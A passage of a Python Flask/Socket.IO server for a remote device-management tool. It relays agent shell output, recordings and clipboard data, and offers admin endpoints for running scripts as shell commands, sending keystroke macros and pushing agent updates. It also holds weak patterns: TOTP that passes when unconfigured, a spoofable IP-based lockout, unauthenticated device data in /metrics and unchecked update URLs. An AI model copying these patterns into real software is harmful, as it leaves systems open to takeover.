    def on_diagnostics_result(data):
        """Agent sent diagnostics bundle — relay to admin dashboards."""
        did = data.get("device_id", "")
        sio.emit("diagnostics_result", data, room=f"view:{did}")
        sio.emit("diagnostics_result", data, room="diagnostics")

    @sio.on("preflight_result")
    def on_preflight_result(data):
        did = data.get("device_id", "")
        ok  = data.get("ok", True)
        if not ok:
            log.warning(f"Agent preflight FAILED: {did} issues={data.get('issues')}")
            _audit("preflight_failed", device_id=did, issues=data.get("issues", []))
        sio.emit("preflight_result", data, room=f"view:{did}")

    @sio.on("config_ack")
    def on_config_ack(data):
        did = data.get("device_id", "")
        _audit("config_hot_reload_ack", device_id=did, changed=data.get("changed", []))

    @sio.on("network_change")
    def on_network_change(data):
        did = data.get("device_id", "")
        log.info(f"Agent network change: {did} +{data.get('added')} -{data.get('removed')}")
        _push_timeline(did, "network_change", data)
        sio.emit("network_change", data, room=f"view:{did}")
        sio.emit("network_change", data, room="dashboards")

    @sio.on("memory_report")
    def on_memory_report(data):
        did = data.get("device_id", "")
        if data.get("pressure"):
            _audit("memory_pressure", device_id=did, ram_pct=data.get("ram_pct"))
        sio.emit("memory_report", data, room=f"view:{did}")

    @sio.on("agent_caps_report")
    def on_agent_caps_report(data):
        """Agent reported its own capability matrix."""
        did  = data.get("device_id", "")
        caps = data.get("caps", {})
        with _dev_lock:
            if did in _devices:
                _devices[did]["agent_caps"] = caps
        _push_timeline(did, "caps_reported", {"caps": list(caps.keys())})

    @sio.on("recording_chunk")
    def on_recording_chunk(data):
        """Agent uploaded a recording chunk — relay to admin viewers."""
        did = data.get("device_id", "")
        sio.emit("recording_chunk", data, room=f"view:{did}")
        sio.emit("recording_chunk", data, room="dashboards")

    @sio.on("recording_done")
    def on_recording_done(data):
        did  = data.get("device_id", "")
        rid  = data.get("rec_id", "")
        chunks = data.get("chunks", 0)
        _audit("recording_done", device_id=did, rec_id=rid, chunks=chunks)
        sio.emit("recording_done", data, room=f"view:{did}")

    @sio.on("network_scan_result")
    def on_network_scan_result(data):
        did = data.get("device_id", "")
        sio.emit("network_scan_result", data, room=f"view:{did}")
        sio.emit("network_scan_result", data, room="dashboards")

    @sio.on("transfer_progress")
    def on_transfer_progress(data):
        did = data.get("device_id", "")
        tid = data.get("transfer_id", "")
        pct = data.get("pct", 0)
        _transfer_progress[tid] = {**data, "updated_at": utcnow()}
        sio.emit("transfer_progress", data, room=f"view:{did}")

    @sio.on("transfer_done")
    def on_transfer_done(data):
        did = data.get("device_id", "")
        sio.emit("transfer_done", data, room=f"view:{did}")

    @sio.on("event_log_result")
    def on_event_log_result(data):
        did = data.get("device_id", "")
        sio.emit("event_log_result", data, room=f"view:{did}")

    @sio.on("file_change")
    def on_file_change(data):
        did = data.get("device_id", "")
        _push_timeline(did, "file_change", {"path": data.get("watch_path")})
        sio.emit("file_change", data, room=f"view:{did}")
        sio.emit("file_change", data, room="dashboards")

    @sio.on("scheduled_job_result")
    def on_scheduled_job_result(data):
        did = data.get("device_id", "")
        _audit("scheduled_job_done", device_id=did, job_id=data.get("job_id"),
               success=data.get("success"))
        sio.emit("scheduled_job_result", data, room=f"view:{did}")

    @sio.on("shell_stream_data")
    def on_shell_stream_data(data):
        did = data.get("device_id", "")
        sio.emit("shell_stream_data", data, room=f"view:{did}")

    @sio.on("shell_stream_done")
    def on_shell_stream_done(data):
        did = data.get("device_id", "")
        sio.emit("shell_stream_done", data, room=f"view:{did}")

    @sio.on("clipboard_sync_ack")
    def on_clipboard_sync_ack(data):
        did = data.get("device_id", "")
        sio.emit("clipboard_sync_ack", data, room=f"view:{did}")

    @sio.on("network_info")
    def on_network_info(data):
        did = data.get("device_id", "")
        sio.emit("network_info", data, room=f"view:{did}")

    @sio.on("session_valid")
    def on_session_valid(data):
        did = data.get("device_id", "")
        sio.emit("session_valid", data, room=f"view:{did}")

    # ── v14: Quality ping broadcast (admin can probe any device) ─────────────
    @app.route("/api/device/<device_id>/quality-ping", methods=["POST"])
    @require_admin
    def api_quality_ping(device_id):
        if not sio:
            return jsonify({"error": "SocketIO unavailable"}), 503
        with _dev_lock:
            dev = _devices.get(device_id)
        if not dev:
            return jsonify({"error": "Device not online"}), 404
        ts = time.time()
        sio.emit("quality_ping", {"ts": ts, "server_ts": utcnow()}, room=device_id)
        agent_adv = _adv_agent_sids.get(device_id)
        if agent_adv:
            sio.emit("quality_ping", {"ts": ts, "server_ts": utcnow()}, room=agent_adv)
        return jsonify({"status": "sent", "ts": ts})

    # ── v14: Diagnostics request proxy ────────────────────────────────────────
    @app.route("/api/device/<device_id>/diagnostics", methods=["POST"])
    @require_admin
    def api_diagnostics_request(device_id):
        if not sio:
            return jsonify({"error": "SocketIO unavailable"}), 503
        with _dev_lock:
            dev = _devices.get(device_id)
        if not dev:
            return jsonify({"error": "Device not online"}), 404
        sio.emit("diagnostics_request", {"device_id": device_id}, room=device_id)
        return jsonify({"status": "requested"})

    # ── v14: Preflight request ────────────────────────────────────────────────
    @app.route("/api/device/<device_id>/preflight", methods=["POST"])
    @require_admin
    def api_preflight_request(device_id):
        if not sio:
            return jsonify({"error": "SocketIO unavailable"}), 503
        sio.emit("preflight_request", {"device_id": device_id}, room=device_id)
        return jsonify({"status": "requested"})

    # ── v14: Memory pressure report ───────────────────────────────────────────
    @app.route("/api/device/<device_id>/memory", methods=["POST"])
    @require_admin
    def api_memory_report_request(device_id):
        if not sio:
            return jsonify({"error": "SocketIO unavailable"}), 503
        sio.emit("memory_report_request", {"device_id": device_id}, room=device_id)
        return jsonify({"status": "requested"})

    # ── Self-ping to keep Render free tier alive ──────────────────────────────
    def _self_ping_loop():
        if SELF_PING_INTERVAL <= 0 or not REQUESTS_OK:
            return
        _sleep(90)
        render_url = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
        ping_url   = f"{render_url}/health" if render_url else f"http://127.0.0.1:{PORT}/health"
        log.info(f"Self-ping: {ping_url} every {SELF_PING_INTERVAL}s")
        while True:
            try:
                _requests.get(ping_url, timeout=15)
            except Exception:
                pass
            _sleep(SELF_PING_INTERVAL)

    sio.start_background_task(_self_ping_loop)

# ══════════════════════════════════════════════════════════════════════════════
#  v12 Enterprise API endpoints
# ══════════════════════════════════════════════════════════════════════════════

# ── Health decomposed ─────────────────────────────────────────────────────────
# ── v13: Real-time FPS endpoint ───────────────────────────────────────────────
@app.route("/api/fps")
def api_fps():
    """Returns current actual FPS per device, measured over the last 2 seconds."""
    result = {}
    for did, ring in list(_device_fps_ring.items()):
        if not ring or len(ring) < 2:
            result[did] = 0.0
            continue
        span = ring[-1] - ring[0]
        result[did] = round((len(ring) - 1) / span, 1) if span > 0 else 0.0
    return jsonify({"fps": result, "ts": utcnow()})


@app.route("/api/latency")
def api_latency():
    """Returns per-device frame latency (ms between last frame and now)."""
    result = {}
    with _dev_lock:
        devs = dict(_devices)
    for did, dev in devs.items():
        lft = dev.get("last_frame_ts")
        if lft:
            try:
                lf_dt = datetime.datetime.fromisoformat(lft.replace("Z",""))
                age_ms = (datetime.datetime.utcnow() - lf_dt).total_seconds() * 1000
                result[did] = round(age_ms, 1)
            except Exception:
                result[did] = -1
    return jsonify({"latency_ms": result, "ts": utcnow()})


@app.route("/health/live")
def health_live():
    return jsonify({"status": "ok", "ts": utcnow()}), 200

@app.route("/health/ready")
def health_ready():
    db_ok = get_sb() is not None
    sio_ok = SOCKETIO_OK and sio is not None
    code = 200 if (db_ok and sio_ok) else 503
    return jsonify({"status": "ready" if code == 200 else "not_ready",
                    "db": db_ok, "socketio": sio_ok, "ts": utcnow()}), code

@app.route("/health/full")
def health_full():
    with _dev_lock:
        online = len(_devices)
    try:
        import psutil
        proc    = psutil.Process()
        mem_rss = proc.memory_info().rss // (1024 * 1024)
        cpu_pct = proc.cpu_percent(interval=0.05)
        disk_gb = psutil.disk_usage("/").free // (1024**3)
    except Exception:
        mem_rss = cpu_pct = disk_gb = None
    return jsonify({
        "status":           "ok",
        "version":          VERSION,
        "server_time":      utcnow(),
        "uptime_seconds":   int(time.time() - _SERVER_START),
        "database":         get_sb() is not None,
        "redis":            _get_redis() is not None,
        "jwt_enabled":      JWT_OK,
        "frame_dedup":      FRAME_DEDUP,
        "org_isolation":    ORG_ISOLATION,
        "devices_online":   online,
        "orgs":             len(_orgs),
        "groups":           len(_groups),
        "scripts":          len(_scripts),
        "macros":           len(_macros),
        "memory_mb":        mem_rss,
        "cpu_pct":          cpu_pct,
        "free_disk_gb":     disk_gb,
    })

# ── JWT auth endpoint ─────────────────────────────────────────────────────────
@app.route("/api/auth/token", methods=["POST"])
def api_auth_token():
    data = request.get_json(silent=True) or {}
    ip   = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
    if _is_locked_out(ip):
        return jsonify({"error": "Too many failed attempts"}), 429
    key  = data.get("admin_key", "")
    role = data.get("role", "viewer")
    if _is_valid_admin_key(key):
        actual_role = "admin"
    elif key == os.environ.get("OPERATOR_KEY", ""):
        actual_role = "operator"
    else:
        _record_auth_failure(ip)
        return jsonify({"error": "Invalid key"}), 401
    if role == "admin" and actual_role != "admin":
        return jsonify({"error": "Insufficient privileges"}), 403
    token = _jwt_encode({"role": actual_role, "sub": f"{actual_role}@{ip}"},
                        ADMIN_JWT_TTL if actual_role == "admin" else JWT_TTL_SECONDS)
    return jsonify({"token": token, "role": actual_role,
                    "expires_in": ADMIN_JWT_TTL if actual_role == "admin" else JWT_TTL_SECONDS})

# ── TOTP verification ─────────────────────────────────────────────────────────
@app.route("/api/auth/totp/verify", methods=["POST"])
@require_admin
def api_totp_verify():
    data  = request.get_json(silent=True) or {}
    otp   = str(data.get("otp", ""))
    secret = os.environ.get("TOTP_SECRET", "")
    if not TOTP_OK or not secret:
        return jsonify({"verified": True, "note": "TOTP not configured — pass-through"})
    totp = _pyotp.TOTP(secret)
    ok   = totp.verify(otp, valid_window=1)
    if not ok:
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
        _record_auth_failure(ip)
    return jsonify({"verified": ok}), (200 if ok else 401)

# ── API key rotation ──────────────────────────────────────────────────────────
@app.route("/api/admin/rotate-key", methods=["POST"])
@require_admin
def api_rotate_key():
    data    = request.get_json(silent=True) or {}
    new_key = data.get("new_key") or secrets.token_hex(24)
    _rotate_api_key(new_key)
    _audit("api_key_rotated")
    return jsonify({"status": "rotated", "new_key": new_key,
                    "window_size": len(_api_keys)})

# ── Hot-reload config ─────────────────────────────────────────────────────────
@app.route("/api/admin/reload", methods=["POST"])
@require_admin
def api_reload():
    """Reload select env vars without restart."""
    global HEARTBEAT_TIMEOUT, MAX_VIEWERS_PER_DEVICE, VIEWER_IDLE_TIMEOUT
    global MAX_SESSION_DURATION, _RATE_LIMIT_RPM, MAX_FRAME_BYTES, MAX_FRAME_KBPS
    try:
        HEARTBEAT_TIMEOUT      = int(os.environ.get("HEARTBEAT_TIMEOUT",      str(HEARTBEAT_TIMEOUT)))
        MAX_VIEWERS_PER_DEVICE = int(os.environ.get("MAX_VIEWERS_PER_DEVICE", str(MAX_VIEWERS_PER_DEVICE)))
        VIEWER_IDLE_TIMEOUT    = int(os.environ.get("VIEWER_IDLE_TIMEOUT",    str(VIEWER_IDLE_TIMEOUT)))
        MAX_SESSION_DURATION   = int(os.environ.get("MAX_SESSION_DURATION",   str(MAX_SESSION_DURATION)))
        _RATE_LIMIT_RPM        = int(os.environ.get("RATE_LIMIT_RPM",         str(_RATE_LIMIT_RPM)))
        MAX_FRAME_BYTES        = int(os.environ.get("MAX_FRAME_BYTES",        str(MAX_FRAME_BYTES)))
        MAX_FRAME_KBPS         = int(os.environ.get("MAX_FRAME_KBPS",        str(MAX_FRAME_KBPS)))
        _audit("config_reloaded")
        return jsonify({"status": "reloaded", "ts": utcnow()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── Organisations CRUD ────────────────────────────────────────────────────────
@app.route("/api/orgs", methods=["GET"])
@require_admin
def api_orgs_list():
    with _org_lock:
        orgs = [{**v, "id": k} for k, v in _orgs.items()]
    return jsonify({"orgs": orgs, "count": len(orgs)})

@app.route("/api/orgs", methods=["POST"])
@require_admin
def api_orgs_create():
    data = request.get_json(silent=True) or {}
    oid  = data.get("id") or uuid.uuid4().hex[:12]
    with _org_lock:
        if oid in _orgs:
            return jsonify({"error": "Org ID already exists"}), 409
        _orgs[oid] = {
            "name":       data.get("name", oid),
            "admin_key":  data.get("admin_key") or secrets.token_hex(16),
            "quota":      int(data.get("quota", 0)),
            "created_at": utcnow(),
        }
    _audit("org_created", org_id=oid)
    return jsonify({"org_id": oid, **_orgs[oid]}), 201

@app.route("/api/orgs/<org_id>", methods=["DELETE"])
@require_admin
def api_orgs_delete(org_id):
    with _org_lock:
        removed = _orgs.pop(org_id, None)
    if not removed:
        return jsonify({"error": "Org not found"}), 404
    _audit("org_deleted", org_id=org_id)
    return jsonify({"status": "deleted", "org_id": org_id})

# ── Groups CRUD ───────────────────────────────────────────────────────────────
@app.route("/api/groups", methods=["GET"])
@require_admin
def api_groups_list():
    with _org_lock:
        groups = [{**{k: v for k, v in g.items() if k != "device_ids"},
                   "device_ids": list(g.get("device_ids", set())),
                   "id": gid}
                  for gid, g in _groups.items()]
    return jsonify({"groups": groups, "count": len(groups)})

@app.route("/api/groups", methods=["POST"])
@require_admin
def api_groups_create():
    data = request.get_json(silent=True) or {}
    gid  = data.get("id") or uuid.uuid4().hex[:12]
    with _org_lock:
        _groups[gid] = {
            "org_id":     data.get("org_id", ""),
            "name":       data.get("name", gid),
            "device_ids": set(data.get("device_ids", [])),
            "created_at": utcnow(),
        }
    _audit("group_created", group_id=gid)
    return jsonify({"group_id": gid}), 201

@app.route("/api/groups/<group_id>/devices", methods=["POST"])
@require_admin
def api_groups_add_device(group_id):
    data = request.get_json(silent=True) or {}
    did  = data.get("device_id", "")
    with _org_lock:
        if group_id not in _groups:
            return jsonify({"error": "Group not found"}), 404
        _groups[group_id]["device_ids"].add(did)
        _device_group[did] = group_id
        if _groups[group_id].get("org_id"):
            _device_org[did] = _groups[group_id]["org_id"]
    return jsonify({"status": "added", "device_id": did, "group_id": group_id})

# ── Device tags ───────────────────────────────────────────────────────────────
@app.route("/api/device/<device_id>/tags", methods=["GET"])
@require_admin
def api_get_tags(device_id):
    return jsonify({"device_id": device_id, "tags": _device_tags.get(device_id, {})})

@app.route("/api/device/<device_id>/tags", methods=["POST", "PATCH"])
@require_admin
def api_set_tags(device_id):
    data = request.get_json(silent=True) or {}
    _device_tags[device_id].update(data)
    return jsonify({"device_id": device_id, "tags": _device_tags[device_id]})

@app.route("/api/device/<device_id>/tags/<key>", methods=["DELETE"])
@require_admin
def api_delete_tag(device_id, key):
    _device_tags[device_id].pop(key, None)
    return jsonify({"status": "deleted"})

# ── Device timeline ───────────────────────────────────────────────────────────
@app.route("/api/device/<device_id>/timeline")
@require_admin
def api_device_timeline(device_id):
    with _timeline_lock:
        events = list(_device_timeline.get(device_id, []))
    return jsonify({"device_id": device_id, "events": events, "count": len(events)})

# ── Bulk command dispatch ─────────────────────────────────────────────────────
@app.route("/api/devices/bulk-command", methods=["POST"])
@require_admin
def api_bulk_command():
    if not sio:
        return jsonify({"error": "SocketIO not available"}), 503
    data       = request.get_json(silent=True) or {}
    device_ids = data.get("device_ids", [])
    group_id   = data.get("group_id")
    command    = data.get("command", {})
    if group_id:
        with _org_lock:
            grp = _groups.get(group_id)
        if grp:
            device_ids = list(grp["device_ids"])
    if not device_ids:
        return jsonify({"error": "No device_ids"}), 400
    sent, skipped = [], []
    with _dev_lock:
        live = set(_devices.keys())
    for did in device_ids:
        if did in live:
            sio.emit("request_action", {"device_id": did, **command}, room=did)
            sent.append(did)
        else:
            skipped.append(did)
    _audit("bulk_command", sent=len(sent), skipped=len(skipped))
    return jsonify({"sent": sent, "skipped": skipped})

# ── Bulk invite generation ────────────────────────────────────────────────────
@app.route("/api/invites/bulk", methods=["POST"])
@require_admin
def api_bulk_invite():
    data    = request.get_json(silent=True) or {}
    count   = min(int(data.get("count", 1)), BULK_INVITE_MAX)
    prefix  = data.get("label_prefix", "Device")
    org_id  = data.get("org_id", "")
    tokens  = []
    for i in range(count):
        token = "MV-" + secrets.token_hex(3).upper() + "-" + secrets.token_hex(3).upper() + "-" + secrets.token_hex(3).upper()
        label = f"{prefix}-{i+1:04d}"
        payload = {"device_id": token, "label": label, "org_id": org_id,
                   "status": "pending", "created_at": utcnow()}
        _bg(db_insert, payload)
        if org_id:
            _device_org[token] = org_id
        tokens.append({"token": token, "label": label})
    _audit("bulk_invite", count=count, org_id=org_id)
    return jsonify({"tokens": tokens, "count": len(tokens)}), 201

# ── CSV export ────────────────────────────────────────────────────────────────
@app.route("/api/sessions/export.csv")
@require_admin
def api_export_csv():
    rows = db_list_all()
    buf  = io.StringIO()
    writer = csv.DictWriter(buf, fieldnames=[
        "device_id","label","status","hostname","os_info","ip_address",
        "agent_version","created_at","connected_at","disconnected_at","expires_at"
    ], extrasaction="ignore")
    writer.writeheader()
    writer.writerows(rows)
    resp = make_response(buf.getvalue())
    resp.headers["Content-Type"]        = "text/csv"
    resp.headers["Content-Disposition"] = "attachment; filename=sessions.csv"
    return resp

# ── Script library ────────────────────────────────────────────────────────────
@app.route("/api/scripts", methods=["GET"])
@require_admin
def api_scripts_list():
    return jsonify({"scripts": [{"id": k, **{x: v[x] for x in v if x != "content"}}
                                for k, v in _scripts.items()]})

@app.route("/api/scripts", methods=["POST"])
@require_admin
def api_scripts_create():
    data = request.get_json(silent=True) or {}
    sid  = uuid.uuid4().hex[:12]
    _scripts[sid] = {
        "name":       data.get("name", sid),
        "content":    data.get("content", ""),
        "tags":       data.get("tags", []),
        "created_at": utcnow(),
        "runs":       0,
    }
    return jsonify({"script_id": sid}), 201

@app.route("/api/scripts/<script_id>/run", methods=["POST"])
@require_admin
def api_scripts_run(script_id):
    if not sio:
        return jsonify({"error": "SocketIO unavailable"}), 503
    script = _scripts.get(script_id)
    if not script:
        return jsonify({"error": "Script not found"}), 404
    data       = request.get_json(silent=True) or {}
    device_ids = data.get("device_ids", [])
    with _dev_lock:
        live = set(_devices.keys())
    sent = []
    for did in device_ids:
        if did in live:
            sio.emit("request_action", {
                "tab": "shell", "command": script["content"],
                "shell_type": data.get("shell_type", "cmd"), "device_id": did,
            }, room=did)
            sent.append(did)
    _scripts[script_id]["runs"] += 1
    _audit("script_run", script_id=script_id, sent=len(sent))
    return jsonify({"sent": sent})

# ── Keyboard macros ───────────────────────────────────────────────────────────
@app.route("/api/macros", methods=["GET"])
@require_admin
def api_macros_list():
    return jsonify({"macros": [{"id": k, **v} for k, v in _macros.items()]})

@app.route("/api/macros", methods=["POST"])
@require_admin
def api_macros_create():
    data = request.get_json(silent=True) or {}
    mid  = uuid.uuid4().hex[:12]
    _macros[mid] = {
        "name":       data.get("name", mid),
        "keys":       data.get("keys", []),
        "org_id":     data.get("org_id", ""),
        "created_at": utcnow(),
    }
    return jsonify({"macro_id": mid}), 201

@app.route("/api/macros/<macro_id>/dispatch", methods=["POST"])
@require_admin
def api_macros_dispatch(macro_id):
    if not sio:
        return jsonify({"error": "SocketIO unavailable"}), 503
    macro = _macros.get(macro_id)
    if not macro:
        return jsonify({"error": "Macro not found"}), 404
    data = request.get_json(silent=True) or {}
    did  = data.get("device_id", "")
    with _dev_lock:
        dev = _devices.get(did)
    if not dev:
        return jsonify({"error": f"Device '{did}' not online"}), 404
    for key in macro["keys"]:
        sio.emit("request_action", {"tab": "key_event", "key": key, "device_id": did}, room=did)
    _audit("macro_dispatched", macro_id=macro_id, device_id=did)
    return jsonify({"status": "dispatched", "keys": len(macro["keys"])})

# ── Scheduled commands ────────────────────────────────────────────────────────
@app.route("/api/schedule", methods=["GET"])
@require_admin
def api_schedule_list():
    with _sched_lock:
        jobs = list(_scheduled_cmds)
    return jsonify({"jobs": jobs, "count": len(jobs)})

@app.route("/api/schedule", methods=["POST"])
@require_admin
def api_schedule_create():
    data = request.get_json(silent=True) or {}
    if len(_scheduled_cmds) >= SCHEDULED_CMD_MAX:
        return jsonify({"error": f"Max scheduled jobs ({SCHEDULED_CMD_MAX}) reached"}), 429
    job = {
        "id":        uuid.uuid4().hex[:12],
        "device_id": data.get("device_id", ""),
        "group_id":  data.get("group_id", ""),
        "cron":      data.get("cron", ""),
        "payload":   data.get("payload", {}),
        "next_run":  data.get("next_run", ""),
        "enabled":   data.get("enabled", True),
        "created_at": utcnow(),
    }
    with _sched_lock:
        _scheduled_cmds.append(job)
    _audit("schedule_created", job_id=job["id"])
    return jsonify(job), 201

@app.route("/api/schedule/<job_id>", methods=["DELETE"])
@require_admin
def api_schedule_delete(job_id):
    with _sched_lock:
        before = len(_scheduled_cmds)
        _scheduled_cmds[:] = [j for j in _scheduled_cmds if j["id"] != job_id]
        deleted = before - len(_scheduled_cmds)
    if not deleted:
        return jsonify({"error": "Job not found"}), 404
    return jsonify({"status": "deleted", "job_id": job_id})

# ── Session recordings index ──────────────────────────────────────────────────
@app.route("/api/recordings", methods=["GET"])
@require_admin
def api_recordings_list():
    return jsonify({"recordings": list(_session_recordings.values()),
                    "count": len(_session_recordings)})

@app.route("/api/recordings", methods=["POST"])
@require_admin
def api_recordings_create():
    data = request.get_json(silent=True) or {}
    rid  = uuid.uuid4().hex
    _session_recordings[rid] = {
        "id":        rid,
        "device_id": data.get("device_id", ""),
        "start":     data.get("start", utcnow()),
        "end":       data.get("end"),
        "size_bytes": data.get("size_bytes", 0),
        "path":      data.get("path", ""),
        "created_at": utcnow(),
    }
    return jsonify({"recording_id": rid}), 201

# ── Transfer progress ─────────────────────────────────────────────────────────
@app.route("/api/transfers", methods=["GET"])
@require_admin
def api_transfers():
    return jsonify({"transfers": list(_transfer_progress.values())})

@app.route("/api/transfers/<transfer_id>", methods=["PUT"])
@require_admin
def api_transfer_update(transfer_id):
    data = request.get_json(silent=True) or {}
    _transfer_progress[transfer_id] = {"id": transfer_id, **data, "updated_at": utcnow()}
    if sio:
        sio.emit("transfer_progress", _transfer_progress[transfer_id],
                 room=f"view:{data.get('device_id','')}")
    return jsonify({"status": "updated"})

# ── Session transfer (hand-off viewer) ────────────────────────────────────────
@app.route("/api/sessions/<viewer_sid>/transfer", methods=["POST"])
@require_admin
def api_session_transfer(viewer_sid):
    if not sio:
        return jsonify({"error": "SocketIO unavailable"}), 503
    data        = request.get_json(silent=True) or {}
    target_sid  = data.get("target_viewer_sid", "")
    with _dash_lock:
        did = _dashboard_device.get(viewer_sid)
    if not did:
        return jsonify({"error": "Viewer session not found"}), 404
    sio.emit("session_transferred", {"device_id": did, "from": viewer_sid, "to": target_sid,
                                     "ts": utcnow()}, room=viewer_sid)
    sio.emit("session_received",    {"device_id": did, "from": viewer_sid, "ts": utcnow()},
             room=target_sid)
    _audit("session_transferred", from_sid=viewer_sid, to_sid=target_sid, device_id=did)
    return jsonify({"status": "transferred", "device_id": did})

# ── Prometheus-compatible /metrics (text/plain) ───────────────────────────────
@app.route("/metrics")
def api_metrics_prometheus():
    accept = request.headers.get("Accept", "")
    if "application/json" in accept:
        # Legacy JSON path
        with _dev_lock:
            devs = list(_devices.values())
        with _view_lock:
            tv = sum(len(v) for v in _viewers.values())
        return jsonify({
            "status": "ok", "version": VERSION,
            "devices_online": len(devs), "viewers": tv,
            "devices": [{
                "id": d.get("device_id"), "device_id": d.get("device_id"),
                "label": d.get("label"), "hostname": d.get("hostname"),
                "os": d.get("os"), "local_ip": d.get("local_ip"),
                "cpu": d.get("cpu"), "ram": d.get("ram"), "status": "online",
            } for d in devs],
            "ts": utcnow(),
        })
    # Prometheus text/plain exposition
    with _dev_lock:
        d_count  = len(_devices)
        fc_total = sum(d.get("frame_count", 0) for d in _devices.values())
    with _view_lock:
        v_count = sum(len(v) for v in _viewers.values())
    uptime = int(time.time() - _SERVER_START)
    try:
        import psutil
        mem_mb  = psutil.Process().memory_info().rss // (1024 * 1024)
        cpu_pct = psutil.Process().cpu_percent(interval=0.05)
    except Exception:
        mem_mb = cpu_pct = 0
    lines = [
        "# HELP mview_devices_online Number of online agents",
        "# TYPE mview_devices_online gauge",
        f"mview_devices_online {d_count}",
        "# HELP mview_viewers_active Number of active viewers",
        "# TYPE mview_viewers_active gauge",
        f"mview_viewers_active {v_count}",
        "# HELP mview_frames_total Total frames relayed",
        "# TYPE mview_frames_total counter",
        f"mview_frames_total {fc_total}",
        "# HELP mview_uptime_seconds Server uptime in seconds",
        "# TYPE mview_uptime_seconds counter",
        f"mview_uptime_seconds {uptime}",
        "# HELP mview_memory_mb Process RSS memory in MB",
        "# TYPE mview_memory_mb gauge",
        f"mview_memory_mb {mem_mb}",
        "# HELP mview_cpu_percent Process CPU percentage",
        "# TYPE mview_cpu_percent gauge",
        f"mview_cpu_percent {cpu_pct}",
        "# HELP mview_orgs_total Total organisations",
        "# TYPE mview_orgs_total gauge",
        f"mview_orgs_total {len(_orgs)}",
        "# HELP mview_groups_total Total groups",
        "# TYPE mview_groups_total gauge",
        f"mview_groups_total {len(_groups)}",
        "",
    ]
    resp = make_response("\n".join(lines))
    resp.headers["Content-Type"] = "text/plain; version=0.0.4; charset=utf-8"
    return resp

# ── Server-Sent Events stream ─────────────────────────────────────────────────
@app.route("/api/events")
def api_sse_stream():
    """SSE endpoint — streams server events to subscribing dashboards."""
    q = queue.Queue(maxsize=200)
    with _sse_lock:
        _sse_subscribers.append(q)
    def generate():
        try:
            last_ping = time.time()
            yield f"data: {json.dumps({'type':'connected','ts':utcnow()})}\n\n"
            while True:
                now = time.time()
                if now - last_ping > SSE_KEEPALIVE:
                    yield ": keepalive\n\n"
                    last_ping = now
                try:
                    msg = q.get(timeout=SSE_KEEPALIVE)
                    yield msg
                except Exception:
                    pass
        finally:
            with _sse_lock:
                try:
                    _sse_subscribers.remove(q)
                except ValueError:
                    pass
    resp = make_response(generate(), 200)
    resp.headers["Content-Type"]     = "text/event-stream"
    resp.headers["Cache-Control"]    = "no-cache"
    resp.headers["X-Accel-Buffering"] = "no"
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp

# ── Graceful shutdown endpoint ────────────────────────────────────────────────
@app.route("/api/admin/shutdown", methods=["POST"])
@require_admin
def api_shutdown():
    def _do_shutdown():
        _sleep(1)
        log.info("Graceful shutdown initiated via API")
        _shutdown_flag.set()
        if sio:
            sio.emit("server_shutdown", {"ts": utcnow(), "reason": "admin_request"})
        _sleep(3)
        os.kill(os.getpid(), signal.SIGTERM)
    _bg(_do_shutdown)
    return jsonify({"status": "shutdown_scheduled", "delay_seconds": 4})

# ── Lockout admin ─────────────────────────────────────────────────────────────
@app.route("/api/admin/lockouts", methods=["GET"])
@require_admin
def api_lockouts():
    now = time.monotonic()
    with _brute_lock:
        active = {ip: round(until - now, 1) for ip, until in _auth_lockouts.items()
                  if until > now}
    return jsonify({"active_lockouts": active, "count": len(active)})

@app.route("/api/admin/lockouts/<ip>", methods=["DELETE"])
@require_admin
def api_lockout_clear(ip):
    with _brute_lock:
        _auth_lockouts.pop(ip, None)
        _auth_failures.pop(ip, None)
    return jsonify({"status": "cleared", "ip": ip})

# ── Wake-on-LAN relay ─────────────────────────────────────────────────────────
@app.route("/api/device/<device_id>/wol", methods=["POST"])
@require_admin
def api_wol(device_id):
    if not sio:
        return jsonify({"error": "SocketIO unavailable"}), 503
    data = request.get_json(silent=True) or {}
    mac  = data.get("mac", "")
    with _dev_lock:
        dev = _devices.get(device_id)
    if dev:
        sio.emit("request_action", {"tab": "wol", "mac": mac, "device_id": device_id}, room=device_id)
        _audit("wol_sent", device_id=device_id, mac=mac)
        return jsonify({"status": "sent"})
    return jsonify({"error": "Device not online — WoL must be relayed via an online peer"}), 404

# ── Agent auto-update push ────────────────────────────────────────────────────
@app.route("/api/admin/push-update", methods=["POST"])
@require_admin
def api_push_update():
    if not sio:
        return jsonify({"error": "SocketIO unavailable"}), 503
    data       = request.get_json(silent=True) or {}
    device_ids = data.get("device_ids")   # None = all
    new_url    = data.get("url", AGENT_STORAGE_URL)
    new_hash   = data.get("sha256", "")
    with _dev_lock:
        targets = list(_devices.keys()) if device_ids is None else device_ids
    sent = 0
    for did in targets:
        sio.emit("request_action", {
            "tab": "auto_update", "url": new_url, "sha256": new_hash,
            "device_id": did,
        }, room=did)
        sent += 1
    _audit("push_update", targets=sent, url=new_url)
    return jsonify({"status": "pushed", "targets": sent})

# ══════════════════════════════════════════════════════════════════════════════
#  Startup banner
# ══════════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════════
#  ENTERPRISE v14 UPGRADE BLOCK
#  ─ SSO / API-key scoping per org
#  ─ Per-org rate limiting (separate bucket per org_id)
#  ─ Device fingerprint verification on agent_connect
#  ─ Signed invite tokens (HMAC) — forgery-proof
#  ─ Connection health scoring per device
#  ─ Multi-tier viewer auth: admin / operator / viewer / guest
#  ─ WebSocket message compression stats
#  ─ Live config push via SSE without reload
#  ─ Org-level webhook routing
#  ─ Device geo-IP enrichment (best-effort)
#  ─ Aggregate Prometheus metrics per org
#  ─ Audit log persistence (JSON-lines file)
#  ─ Anomaly detection: rapid reconnect storm throttle
#  ─ Graceful schema migration for Supabase (auto-add columns)
# ══════════════════════════════════════════════════════════════════════════════

# ── Audit log persistence ─────────────────────────────────────────────────────
_AUDIT_LOG_FILE = os.environ.get("AUDIT_LOG_FILE", "audit.jsonl")

def _persist_audit(entry: dict):
    """Append audit entry to JSON-lines file (non-blocking)."""
    try:
        with open(_AUDIT_LOG_FILE, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(entry) + "\n")
        # Rotate if > 10MB
        if os.path.getsize(_AUDIT_LOG_FILE) > 10 * 1024 * 1024:
            bak = _AUDIT_LOG_FILE + ".1"
            try:
